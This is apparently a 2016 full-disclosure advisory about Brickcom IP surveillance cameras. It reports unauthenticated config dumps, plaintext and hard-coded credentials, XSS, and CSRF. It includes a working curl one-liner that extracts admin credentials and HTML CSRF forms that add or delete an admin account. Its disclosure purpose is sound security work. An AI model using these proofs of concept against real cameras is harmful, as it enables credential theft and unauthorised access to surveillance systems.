@@ -1,0 +1,394 @@
+                         _ _ _       _
+                        | | | |     | |
+  ___  _ ____      _____| | | | __ _| |__  ___
+ / _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|
+| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \
+ \___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/
+
+
+Security Adivisory
+   2016-04-12
+                www.orwelllabs.com
+                  twt:@orwelllabs
+
+
+                                   sm1thw@0rw3lll4bs:~/bb# ./Bruce.S
+                                   [+] surveillance is the business model
+of the internet - OK!
+                                   sm1thw@0rw3lll4bs:~/bb# echo $?
+                                   6079
+
+
+
+
+Adivisory Information
+=====================
+Vendor: Brickcom Corporation
+CVE-Number:N/A
+Adivisory-URL:
+http://www.orwelllabs.com/2016/04/Brickcom-Multiple-Vulnerabilities.html
+OLSA-ID: OLSA-2015-12-12
+Impact: High (especially because some of these products are used in
+critical environments.)
+Remote: Yes
+
+
+
+          p4n0pt1c0n
+
+I.   Insecure Direct Object Reference/Authentication Bypass
+II.  Sensitive information in plaintext
+III. Hard-coded Credentials
+IV.  Cross-site scripting
+V.   Basic Authentication
+VI.  Cross-site Request Forgery
+
+
+
+
+Background
+----------
+Brickcom (calls itself) as a "leading network video manufacturer in the IP
+surveillance industry.
+Dedicated to providing the best IP surveillance solutions with a solid
+foundation for engineering
+quality network video equipment with a Research and Development Department
+that has been producing
+wireless broadband networking equipment for over twenty years."
+
+These products are used as video surveillance system by costumers and
+important sectors such as the Thai 4ir F0rce, as can be seen on the
+Vendor's web site.
+
+* notes:
+
+- some firmwares affected (item 'affected products' are very recent, having
+been launched
+a few months ago, and still vulnerable ... so this is an structural/legacy
+problem.
+
+- sensitive information presented in this advisory are fake.
+
+
+
+I. Insecure Direct Object Reference/Authentication Bypass
+---------------------------------------------------------
+(+) affected scripts
+- configfile.dump
+      - syslog.dump
+
+
+Path: Maintenance -> Configuration -> 'Export'
+
++ configfile.dump
+
+An unauthenticated GET request to the script "configfile.dump", as follows:
+   http://xxx.xxx.xxx.xxx/configfile.dump?action=get
+
+or like this
+
+   http://xxx.xxx.xxx.xxx/configfile.dump.backup
+   http://xxx.xxx.xxx.xxx/configfile.dump.gz
+
+or just
+   http://xxx.xxx.xxx.xxx/configfile.dump
+
+returns all camera settings
+
+[..code_snip..]
+
+   DeviceBasicInfo.firmwareVersion=v3.0.6.12
+   DeviceBasicInfo.macAddress=00:00:00:00:00:00
+   DeviceBasicInfo.sensorID=OV9X11
+   DeviceBasicInfo.internalName=Brickcom
+   DeviceBasicInfo.productName=Di-1092AX
+   DeviceBasicInfo.displayName=CB-1092AX
+   DeviceBasicInfo.modelNumber=XXX
+   DeviceBasicInfo.companyName=Brickcom Corporation
+   DeviceBasicInfo.comments=[CUBE HD IPCam STREEDM]
+   DeviceBasicInfo.companyUrl=www.brickcom.com
+   DeviceBasicInfo.serialNumber=AXNB02B211111
+   DeviceBasicInfo.skuType=LIT
+   DeviceBasicInfo.ledIndicatorMode=1
+   DeviceBasicInfo.minorFW=1
+   DeviceBasicInfo.hardwareVersion=
+   DeviceBasicInfo.PseudoPDseProdNum=P3301
+   AudioDeviceSetting.muted=0
+
+[..code_snip..]
+
+and all credentials including the administrator account, like this:
+
+
+UserSetSetting.userList.size=2
+UserSetSetting.userList.users0.index=0
+UserSetSetting.userList.users0.password=MyM4st3rP4ss   <<<--- admin pass
+UserSetSetting.userList.users0.privilege=1
+UserSetSetting.userList.users0.username=Cam_User       <<<--- admin user
+UserSetSetting.userList.users1.index=0
+UserSetSetting.userList.users1.password=C0mm0mP4ss     <<<--- (commom) user
+pass
+UserSetSetting.userList.users1.privilege=1
+UserSetSetting.userList.users1.username=User_name      <<<--- (commom)
+username
+UserSetSetting.userList.users2.index=0
+UserSetSetting.userList.users2.password=[..code_snip..]
+  [snip]
+BasicNetworkSetting.pppoe.password=                   <<<--- ppoe user
+BasicNetworkSetting.pppoe.username=                   <<<--- ppoe pass
+UPnPSetting.enabled=1
+UPnPSetting.name=CB-102Ap-1ffc3
+Brickcom.enabled=1
+DDNSSetting.dyndnsEnabled=0
+DDNSSetting.dyndns.wildcardEnabled=0
+DDNSSetting.dyndns.username=                         <<<--- dyndns user
+DDNSSetting.dyndns.password=                         <<<--- dyndns password
+DDNSSetting.dyndns.hostname=
+DDNSSetting.tzodnsEnabled=0
+DDNSSetting.tzodns.wildcardEnabled=0
+DDNSSetting.tzodns.username=                         <<<--- and here...
+DDNSSetting.tzodns.password=                         <<<--- here....
+DDNSSetting.tzodns.hostname=
+DDNSSetting.noipdnsEnabled=0
+DDNSSetting.noipdns.wildcardEnabled=0
+DDNSSetting.noipdns.username=                        <<<--- here
+DDNSSetting.noipdns.password=                        <<<--- here
+DDNSSetting.noipdns.hostname=
+and many others...
+
+- Path: System -> System Log -> 'Save to File'
+
++ syslog.dump
+
+- Request:
+(unauthenticated) GET http://xxx.xxx.xxx.xxx/syslog.dump?action=get
+
+- Response:
+[..code_snip..]
+
+LOG_NOTICE-WebServer :User '[admin]' logged in to [web server], Sat Mar 1
+21:13:36 2014
+LOG_NOTICE-WebServer :User '[admin]' logged in to [web server], Sat Mar 1
+21:11:02 2014
+
+[..code_snip..]
+
+
+Proof of Concept
+`````````````````
+Online Bash exploit-p0c:
+curl -s -O http://xxx.xxx.xxx.xxx/configfile.dump && grep "users0"
+configfile.dump|awk '{ FS="."; } { print $4; }' || echo -e "[-] The target
+seems not be vulnerable, Mr. Robot! \n"
+
+IF target (xxx.xxx.xxx.xxx) is vulnerable the exploit will show a username,
+password and privilege level (1:admin), like this:
+
+password=4adm1niS3cr3tP4ss
+privilege=1
+username=BrickcomADMIN
+
+and a configfile.dump with all credentials, settings, etc. will be recorded
+locally.
+IF not vulnerable, you'll see the message:
+
+ "[-] The target seems not bet vulnerable, Mr. Robot!"
+
+
+II. sensitive information in plaintext
+--------------------------------------
+As shown, there are countless cases where credentials and other sensitive
+information are store in plaintext.
+
+
+III. Hard-coded Credentials
+---------------------------
+All credentials and other sensitive information can be found in html page
+user_management_config.html,
+Just viewing the html source code:
+
+view-source:http://{xxx.xxx.xxx.xxx}/user_management_config.html
+
+<script type="text/javascript">
+var Edit_id="";
+var userSet_size="5"
+var User_index=new Array(10);
+var User_username=new Array(10);
+var User_password=new Array(10);
+var User_privilege=new Array(10);
+
+User_index[0]="1";
+User_username[0]="admin"; <<<----
+User_password[0]="admin"; <<<----
+User_privilege[0]="1";
+
+User_index[1]="2";
+User_username[1]="masteruser"; <<<----
+User_password[1]="masterP4sss1*"; <<<----
+User_privilege[1]="0";
+
+
+IV. Cross-site scripting
+------------------------
+(+) Script: /cgi-bin/NotificationTest.cgi
+(+) Param: action=
+
+
+REQUEST: http://xxx.xxx.xxx.xxx/cgi-bin/NotificationTest.cgi?action=[ **
+XSS
+**]&addressType=&hostname=h0stn4mE&ipAddress=xxx.xxx.xxxx.xxx&ipv6Address=&portNo=&accountName=brickcom&password=brickcom&ShareDIR=
+
+
+V. Basic Authentication
+-----------------------
+The response asks the user to enter credentials for Basic HTTP
+authentication.
+If these are supplied, they will be submitted over clear-text HTTP (in
+Base64-encoded form).
+
+
+V. Cross-site Request Forgery
+-----------------------------
+# To add an administrative credential: "brickcom:brickcom"
+
+> Privilege levels:
+- visor : 0
+- admin : 1
+- visor remoto : 2
+
+
+<html>
+  <!-- Brickcom FB-100Ae IP Box Camera- CSRF PoC -->
+  <body>
+    <form action="http://{xxx.xxx.xxx.xxx}/cgi-bin/users.cgi" method="POST">
+      <input type="hidden" name="action" value="add" />
+      <input type="hidden" name="index" value="0" />
+      <input type="hidden" name="username" value="brickcom" />
+      <input type="hidden" name="password" value="brickcom" />
+      <input type="hidden" name="privilege" value="1" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+# to remove this credential:
+
+<html>
+  <!-- Brickcom FB-100Ae IP Box Camera- CSRF PoC -->
+  <body>
+    <form action="http://{xxx.xxx.xxx.xxx}/cgi-bin/users.cgi" method="POST">
+      <input type="hidden" name="action" value="delete" />
+      <input type="hidden" name="username" value="brickcom" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+affected products
+-----------------
+(+) various products, including models:
+
+  Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12
+(release:09/08/2010 14:46)
+  Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26
+(release:01/21/2011 18:31)
+
+  Vandal Dome Cameras
+  -------------------
+  Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise
+(release:2015-10-01_18:46:07)
+  Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T
+(release:2016-03-21_10:08:24)
+  Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T
+(release:2015-06-25_11:18:07)
+
+  Bullet Cameras
+  --------------
+  Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R
+(release:2015-09-08_18:40:11)
+  Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R
+(release:2015-10-16_11:36:46)
+  Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R
+(release:2015-10-15_11:30:46)
+  Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR
+(release:2016-01-18_10:07:03)
+  Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version:
+v3.7.0.17A (release: 2015-07-10_11:36:41)
+  Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version:
+v3.7.0.18.3R (release: 2015-10-15_11:30:46)
+
+
+  Mini Dome Camera
+  ----------------
+  Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8
+(release:2013-08-01)
+
+
+  Cube Camera
+  -----------
+  Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release:
+09/07/2010 11:45)
+
+
+  Fixed Dome Camera
+  -----------------
+  Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R
+(release: 2015-08-19_18:47:31)
+
+
+Legal Notices
++++++++++++++
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or misuse of
+this information.
+
+
+Timeline
+++++++++
+2015-03-20  - Issues discovered
+2015-03-30  - attempt to contact Vendor
+2015-12-12  - attempt to assign CVE
+2016-04-12  - Not easy way to contact vendor, (ON Twitter) the last tweet
+was 2011-01-31...
+2016-04-14  - Full disclosure
+
+
+About Orwelllabs
+++++++++++++++++
+Orwelllabs is a (doubleplusungood) security research lab interested in
+embedded device & webapp hacking &&
+aims to create some intelligence around this vast and confusing picture
+that is the Internet of things.
+
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
+xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
+xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
+55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
+U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
+SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
+d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
+AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
+Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
+f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
+pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
+LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
+95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
+AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
+ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
+gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
+tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
+6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
+TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
+DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
+MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
+Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
+FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
+I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
+C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
+=IZYl
+-----END PGP PUBLIC KEY BLOCK-----
